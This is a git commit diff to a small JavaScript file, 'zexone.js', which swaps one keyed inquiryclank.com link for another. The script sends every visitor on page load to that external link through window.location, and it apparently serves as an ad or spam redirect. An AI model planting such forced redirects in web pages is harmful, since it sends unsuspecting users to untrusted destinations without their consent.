c1e26ff74f19ebeccc080334e0d3c6cbf515772a
Lara Johns <80411308+jarollellhel@users.noreply.github.com>
2022-01-29 19:55:37 +0800

    Update zexone.js

--- zexone.js
+++ zexone.js
@@ -1,6 +1,6 @@
 var dataUrl = [
 
-  'https://inquiryclank.com/z5u26gw0i?key=afd8bed48a5de3937c8422b84862a994'
+  'https://inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
